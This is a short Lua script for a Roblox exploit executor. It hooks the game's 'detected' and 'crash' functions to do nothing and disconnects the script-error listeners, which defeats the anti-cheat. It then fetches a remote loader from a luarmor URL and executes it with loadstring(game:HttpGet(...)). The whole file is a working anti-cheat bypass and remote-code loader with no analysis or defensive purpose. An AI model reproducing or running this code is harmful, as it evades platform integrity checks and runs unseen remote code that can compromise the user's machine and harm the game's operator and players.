pcall(function()
    repeat wait() until game:IsLoaded()
    pcall(function()
        pcall(function()
            pcall(function()
                if getconnections then
                    for _, v in pairs(getgc(true)) do
                        if type(v) == "function" then
                            local info = debug.getinfo(v)
                            local name = info.name:lower()
                            if name == "detected" or name == 'crash' then
                                hookfunction(v, function() end)
                            end
                         end
                     end
                     for i,v in next,getconnections(game:GetService('ScriptContext').Error) do v:Disconnect() end
                end
            end)
        end)
        task.wait(1.25)
    end)
end)
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/3437e5df438f126562c22e3e31ad895b.lua"))()
